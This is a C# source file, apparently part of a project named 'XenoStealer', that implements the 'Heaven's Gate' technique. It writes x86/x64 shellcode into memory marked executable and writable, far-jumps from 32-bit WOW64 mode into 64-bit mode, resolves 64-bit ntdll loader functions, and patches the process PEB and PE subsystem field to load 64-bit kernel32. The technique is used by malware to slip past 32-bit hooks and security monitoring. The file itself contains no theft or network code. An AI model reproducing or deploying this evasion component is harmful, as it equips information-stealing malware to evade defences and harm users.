using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class HeavensGate
    {
        static HeavensGate()
        {
            if (Environment.Is64BitProcess)
            {
                return;
            }
            CurrentProcessDuplicateHandle = NativeMethods.GetCurrentProcess();
            if (!NativeMethods.DuplicateHandle(CurrentProcessDuplicateHandle, CurrentProcessDuplicateHandle, CurrentProcessDuplicateHandle, ref CurrentProcessDuplicateHandle, 0, false, 2))
            {
                return;
            }
            ntdll64 = Utils64.GetRemoteModuleHandle64Bit(CurrentProcessDuplicateHandle, "ntdll.dll");
            if (ntdll64 == 0)
            {
                return;
            }
            LdrLoadDll = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrLoadDll");
            if (LdrLoadDll == 0)
            {
                return;
            }
            LdrUnloadDll = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrUnloadDll");
            if (LdrLoadDll == 0)
            {
                return;
            }
            LdrGetDllHandle = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrGetDllHandle");
            if (LdrGetDllHandle == 0)
            {
                return;
            }
            LdrGetProcedureAddress = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrGetProcedureAddress");
            if (LdrGetProcedureAddress == 0)
            {
                return;
            }
            operational = true;
        }

        public static bool operational = false;

        private static ulong LdrLoadDll;
        private static ulong LdrUnloadDll;
        private static ulong LdrGetDllHandle;
        private static ulong LdrGetProcedureAddress;
        private static IntPtr CurrentProcessDuplicateHandle;


        private static ulong ntdll64;
        private static ulong Kernel3264 = 0;


        private delegate ulong Wow64Execution(IntPtr func, IntPtr parameters);

        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        private static byte[] Wow64ExecuteShellCode = {
	        //BITS32
	        0x55,										//push ebp
	        0x89, 0xe5,									//mov ebp, esp
	        0x56,										//push esi
	        0x57,										//push edi
	        0x8b, 0x75, 0x08,							//mov esi, dword ptr ss:[ebp + 0x8]
	        0x8b, 0x4d, 0x0c,							//mov ecx, dword ptr ss:[ebp + 0xC]
	        0xe8, 0x00, 0x00, 0x00, 0x00,				//call $0
	        0x58,										//pop eax
	        0x83, 0xc0, 0x2a,							//add eax, 0x2A
	        0x83, 0xec, 0x08,							//sub esp, 0x8
	        0x89, 0xe2,									//mov edx, esp
	        0xc7, 0x42, 0x04, 0x33, 0x00, 0x00, 0x00,	//mov dword ptr ds:[edx + 0x4], 0x33
	        0x89, 0x02,									//mov dword ptr ds:[edx], eax
	        0xe8, 0x0e, 0x00, 0x00, 0x00,				//call SwitchTo64
	        0x66, 0x8c, 0xd9,							//mov cx, ds
	        0x8e, 0xd1,									//mov ss, cx
	        0x83, 0xc4, 0x14,							//add esp, 0x14
	        0x5f,										//pop edi
	        0x5e,										//pop esi
	        0x5d,										//pop ebp
	        0xc2, 0x08, 0x00,							//ret 0x8

	        //SwitchTo64:
	        0x8b, 0x3c, 0x24,							//mov edi, dword ptr ss:[esp]
	        0xff, 0x2a,									//jmp far fword ptr ds:[edx]


	        //BITS64
	        0x48, 0x31, 0xc0,							//xor rax, rax
	        0x57,										//push rdi
	        0xff, 0xd6,									//call rsi
	        0x5f,										//pop rdi
	        0x50,										//push rax
	        0xc7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00,//mov dword ptr ss:[rsp + 0x4], 0x23
	        0x89, 0x3c, 0x24,							//mov dword ptr ss:[rsp], edi
	        0x48, 0x89, 0xC2,							//mov rdx, rax
	        0x21, 0xC0,									//and eax, eax
	        0x48, 0xC1, 0xEA, 0x20,						//shr rdx, 0x20 
	        0xff, 0x2c, 0x24,							//jmp far fword ptr ss:[rsp]
        };


        private static IntPtr UlongParamsToIntPtr(ulong[] parameters)
        {
            IntPtr ParamPtr = Marshal.AllocHGlobal(parameters.Length * sizeof(ulong));
            for (int i = 0; i < parameters.Length; i++)
            {
                byte[] ulongBytes = BitConverter.GetBytes(parameters[i]);
                Marshal.Copy(ulongBytes, 0, ParamPtr + (i * sizeof(ulong)), ulongBytes.Length);
            }
            return ParamPtr;
        }



        private static ulong DispatchX64Call(byte[] code, ulong[] parameters)
        {
            ulong result = ulong.MaxValue;
            if (code == null || code.Length == 0)
            {
                return result;
            }

            int ShellCodeLength = Wow64ExecuteShellCode.Length + code.Length;

            IntPtr pExecutableCode = Marshal.AllocHGlobal(ShellCodeLength);

            Marshal.Copy(Wow64ExecuteShellCode, 0, pExecutableCode, Wow64ExecuteShellCode.Length);
            Marshal.Copy(code, 0, pExecutableCode + Wow64ExecuteShellCode.Length, code.Length);

            bool Worked = NativeMethods.VirtualProtect(pExecutableCode, (UIntPtr)ShellCodeLength, PAGE_EXECUTE_READWRITE, out uint OldProtectValue);

            if (!Worked)
            {
                throw new Exception("Couldnt set the shellcode memory as PAGE_EXECUTE_READWRITE!");
            }

            Wow64Execution exec = Marshal.GetDelegateForFunctionPointer<Wow64Execution>(pExecutableCode);

            IntPtr paramPtr = IntPtr.Zero;
            if (parameters != null && parameters.Length > 0)
            {
                paramPtr = UlongParamsToIntPtr(parameters);
            }

            result = exec(pExecutableCode + Wow64ExecuteShellCode.Length, paramPtr);

            Marshal.FreeHGlobal(pExecutableCode);

            if (paramPtr != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(paramPtr);
            }

            return result;
        }

        public static ulong Execute64(ulong Function, params ulong[] pFunctionParameters)
        {
            if (!operational)
            {
                throw new Exception("HeavensGate did not start up properly or is on a x64 process");
            }
            int dwParameters = pFunctionParameters.Length;

            //BITS 64
            byte[] prologue = {
                0xFC,										//cld
		        0x48, 0x89, 0xCE,							//mov rsi, rcx
		        0x48, 0x89, 0xE7,							//mov rdi, rsp
		        0x48, 0x83, 0xEC, 0x10,						//sub rsp, 0x10
		        0x40, 0x80, 0xE4, 0x00,						//and spl, 0x0
	        };

            //BITS 64
            byte[] epilogue = {
                0x31, 0xC0,														//xor eax, eax
		        0x49, 0xBA, 0xF1, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,		//mov r10, FunctionAddress
		        0x41, 0xFF, 0xD2,												//call r10
		        0x48, 0x89, 0xFC,												//mov rsp, rdi
		        0xC3															//ret
	        };

            List<byte> code = new List<byte>(prologue);

            if (dwParameters < 4)
            {
                int c = dwParameters < 4 ? dwParameters : 4;
                for (int i = 0; i < c; ++i)
                {
                    switch (i)
                    {
                        case 0:
                            //mov rcx, qword ptr ds:[rsi]
                            code.AddRange(new byte[] { 0x48, 0x8B, 0x0E });
                            break;
                        case 1:
                            //mov rdx, qword ptr ds:[rsi + 0x8]
                            code.AddRange(new byte[] { 0x48, 0x8B, 0x56, 0x08 });
                            break;
                        case 2:
                            //mov r8, qword ptr ds:[rsi + 0x10]
                            code.AddRange(new byte[] { 0x4C, 0x8B, 0x46, 0x10 });
                            break;
                        case 3:
                            //mov r9, qword ptr ds:[rsi + 0x18]
                            code.AddRange(new byte[] { 0x4C, 0x8B, 0x4E, 0x18 });
                            break;
                    }
                }
            }
            else
            {
                //all the switch statements combined
                code.AddRange(new byte[] { 0x48, 0x8B, 0x0E, 0x48, 0x8B, 0x56, 0x08, 0x4C, 0x8B, 0x46, 0x10, 0x4C, 0x8B, 0x4E, 0x18 });
                if ((dwParameters % 2) != 0)
                {
                    // push 0x0
                    code.AddRange(new byte[] { 0x6A, 0x00 });
                }
                byte[] code_buffer1 = new byte[] { 0x48, 0x8B, 0x46, 0x20, 0x50 };
                byte[] code_buffer2 = new byte[] { 0x48, 0x8B, 0x86, 0x80, 0x00, 0x00, 0x00, 0x50 };

                if (dwParameters * 8 >= 0x7fffffff)
                {
                    return ulong.MaxValue;
                }

                for (int i = dwParameters - 1; i >= 4; --i)
                {
                    if (i * 8 < 0x7f)
                    {
                        code_buffer1[3] = (byte)(i * 8);
                        code.AddRange(code_buffer1);
                    }
                    else
                    {
                        BitConverter.GetBytes(i * 8).CopyTo(code_buffer2, 3);
                        code.AddRange(code_buffer2);
                    }
                }

            }

            code.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });

            BitConverter.GetBytes(Function).CopyTo(epilogue, 4);
            code.AddRange(epilogue);

            return DispatchX64Call(code.ToArray(), pFunctionParameters);
        }

        private static ulong GetProcessParameters()
        {
            InternalStructs64.PROCESS_BASIC_INFORMATION64 PBI = new InternalStructs64.PROCESS_BASIC_INFORMATION64();
            uint PBI_size = (uint)Marshal.SizeOf(PBI);
            uint NTread_out = 0;
            if (SpecialNativeMethods.NtQueryPBI64From32(CurrentProcessDuplicateHandle, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out) != 0 || PBI.PebBaseAddress == 0)
            {
                throw new Exception("couldnt read PBI from process!");
            }
            ulong processParameters = GetProcessParameters64(PBI.PebBaseAddress);

            IntPtr ProcessParametersBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
            ulong len = 0;
            int ReadVirtualMemoryStatus = SpecialNativeMethods.ReadProcessMemory64From32(
                CurrentProcessDuplicateHandle,
                processParameters,
                ProcessParametersBuffer,
                (ulong)Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT)),
                ref len
            );
            if (ReadVirtualMemoryStatus != 0)
            {
                Marshal.FreeHGlobal(ProcessParametersBuffer);
                throw new Exception("Couldnt read the processParameters");
            }
            processParameters = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(ProcessParametersBuffer).Value;
            Marshal.FreeHGlobal(ProcessParametersBuffer);
            return processParameters;

        }

        private static ulong GetProcessParameters64(ulong addr)
        {
            return addr + 0x20;
        }

        private static InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 GetRTLParams()
        {
            ulong processParameters = GetProcessParameters();

            int RTL_PARAMS_SIZE = Marshal.SizeOf(typeof(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64));
            IntPtr RTL_PARAMS_PTR = Marshal.AllocHGlobal(RTL_PARAMS_SIZE);
            ulong len = 0;
            int ReadVirtualMemoryStatus = SpecialNativeMethods.ReadProcessMemory64From32(
                CurrentProcessDuplicateHandle,
                processParameters,
                RTL_PARAMS_PTR,
                (ulong)RTL_PARAMS_SIZE,
                ref len
            );
            if (ReadVirtualMemoryStatus != 0)
            {
                Marshal.FreeHGlobal(RTL_PARAMS_PTR);
                throw new Exception("Couldnt read the RTL_USER_PROCESS_PARAMETERS");
            }

            InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS = Marshal.PtrToStructure<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>(RTL_PARAMS_PTR);
            Marshal.FreeHGlobal(RTL_PARAMS_PTR);
            return RTL_PARAMS;
        }

        private static void WriteRTLParams(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS)
        {
            ulong processParameters = GetProcessParameters();

            int RTL_PARAMS_SIZE = Marshal.SizeOf(typeof(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64));
            IntPtr RTL_PARAMS_PTR = Marshal.AllocHGlobal(RTL_PARAMS_SIZE);
            Marshal.StructureToPtr(RTL_PARAMS, RTL_PARAMS_PTR, false);
            ulong len = 0;
            int WriteVirtualMemoryStatus = SpecialNativeMethods.WriteProcessMemory64From32(CurrentProcessDuplicateHandle, processParameters, RTL_PARAMS_PTR, (ulong)RTL_PARAMS_SIZE, ref len);
            Marshal.FreeHGlobal(RTL_PARAMS_PTR);
            if (WriteVirtualMemoryStatus != 0)
            {
                throw new Exception("Couldnt write the RTL_USER_PROCESS_PARAMETERS");
            }
        }

        private static Tuple<ulong[], uint[]> CaptureConsoleHandles64()
        {
            InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS = GetRTLParams();

            ulong[] handles = new ulong[] { RTL_PARAMS.ConsoleHandle, RTL_PARAMS.StandardInput, RTL_PARAMS.StandardOutput, RTL_PARAMS.StandardError };
            uint[] flags = new uint[] { RTL_PARAMS.WindowFlags, RTL_PARAMS.ConsoleFlags };

            return new Tuple<ulong[], uint[]>(handles, flags);

        }

        private static void WriteConsoleHandles64(ulong ConsoleHandle, ulong StandardInput, ulong StandardOutput, ulong StandardError, uint WindowFlags, uint ConsoleFlags)
        {


            ulong processParameters = GetProcessParameters();

            InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS = GetRTLParams();
            RTL_PARAMS.ConsoleHandle = ConsoleHandle;
            RTL_PARAMS.StandardInput = StandardInput;
            RTL_PARAMS.StandardOutput = StandardOutput;
            RTL_PARAMS.StandardError = StandardError;
            RTL_PARAMS.WindowFlags = WindowFlags;
            RTL_PARAMS.ConsoleFlags = ConsoleFlags;


            WriteRTLParams(RTL_PARAMS);
        }

        private static void WriteConsoleHandles64(ulong[] handle, uint[] flags)
        {
            if (handle.Length != 4 || flags.Length != 2)
            {
                throw new Exception("invalid arguments, there must be 4 handles and 2 flags!");
            }
            WriteConsoleHandles64(handle[0], handle[1], handle[2], handle[3], flags[0], flags[1]);
        }
        public static ulong LoadKernel32()
        {
            if (!operational)
            {
                throw new Exception("HeavensGate did not start up properly or is on a x64 process");
            }
            if (Kernel3264 != 0)
            {
                return Kernel3264;
            }

            IntPtr NtHeaderAddr = (IntPtr)Utils32.GetNtHeader32Addr(CurrentProcessDuplicateHandle, (uint)NativeMethods.GetModuleHandleW(null));

            InternalStructs32.IMAGE_NT_HEADERS32 NtHeader = Marshal.PtrToStructure<InternalStructs32.IMAGE_NT_HEADERS32>(NtHeaderAddr);

            IntPtr subSystemAddress = (IntPtr)((uint)NtHeaderAddr + (uint)Marshal.OffsetOf(typeof(InternalStructs32.IMAGE_NT_HEADERS32), "OptionalHeader") + (uint)Marshal.OffsetOf(typeof(InternalStructs32.IMAGE_OPTIONAL_HEADER32), "Subsystem"));

            uint PAGE_READWRITE = 0x04;
            ushort IMAGE_SUBSYSTEM_WINDOWS_CUI = 3;
            ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;

            if (NtHeader.OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI)
            {
                if (NativeMethods.VirtualProtect(subSystemAddress, (UIntPtr)Marshal.SizeOf(typeof(ushort)), PAGE_READWRITE, out uint oldProtect))
                {
                    Tuple<ulong[], uint[]> HandlesAndFlags = CaptureConsoleHandles64();
                    WriteConsoleHandles64(0, 0, 0, 0, 0, 0);
                    Marshal.WriteInt16(subSystemAddress, (short)IMAGE_SUBSYSTEM_WINDOWS_GUI);
                    Kernel3264 = LoadLibrary64("kernel32.dll");
                    WriteConsoleHandles64(HandlesAndFlags.Item1, HandlesAndFlags.Item2);
                    Marshal.WriteInt16(subSystemAddress, (short)IMAGE_SUBSYSTEM_WINDOWS_CUI);
                    NativeMethods.VirtualProtect(subSystemAddress, (UIntPtr)Marshal.SizeOf(typeof(ushort)), oldProtect, out oldProtect);
                }
            }
            else
            {
                Kernel3264 = LoadLibrary64("kernel32.dll");
            }

            return Kernel3264;
        }

        public static ulong GetModuleHandle64(string ModuleName)
        {
            if (!operational)
            {
                throw new Exception("HeavensGate did not start up properly or is on a x64 process");
            }
            return Utils64.GetRemoteModuleHandle64Bit(CurrentProcessDuplicateHandle, ModuleName);
        }

        public static ulong LoadLibrary64(string LibraryName)
        {
            if (!operational)
            {
                throw new Exception("HeavensGate did not start up properly or is on a x64 process");
            }
            InternalStructs64.UNICODE_STRING64 uniStr64 = new InternalStructs64.UNICODE_STRING64();

            uniStr64.Buffer = (ulong)Marshal.StringToHGlobalUni(LibraryName);
            uniStr64.Length = (ushort)(LibraryName.Length * 2); // multiplied by 2 for 2 bytes per char as per unicode
            uniStr64.MaximumLength = (ushort)((LibraryName.Length + 1) * 2);//fullsize with nullbyte, multiplied by 2 for 2 bytes per char as per unicode

            IntPtr uniStr64Ptr = Marshal.AllocHGlobal(Marshal.SizeOf(uniStr64));

            Marshal.StructureToPtr(uniStr64, uniStr64Ptr, false);

            IntPtr modulePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT)));

            ulong result = Execute64(LdrLoadDll, 0, 0, (ulong)uniStr64Ptr, (ulong)modulePtr);

            ulong ModuleHandle = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(modulePtr).Value;

            Marshal.FreeHGlobal((IntPtr)uniStr64.Buffer);
            Marshal.FreeHGlobal(modulePtr);
            Marshal.FreeHGlobal(uniStr64Ptr);
            if (result != 0)
            {
                return 0;
            }
            return ModuleHandle;
        }

        public static bool FreeLibrary64(ulong ModuleHandle)
        {
            return Execute64(LdrUnloadDll, ModuleHandle) == 0;
        }

        public static ulong GetProcAddress64(ulong ModuleHandle, string FunctionName)
        {
            if (!operational)
            {
                throw new Exception("HeavensGate did not start up properly or is on a x64 process");
            }
            return Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ModuleHandle, FunctionName);
        }

    }
}
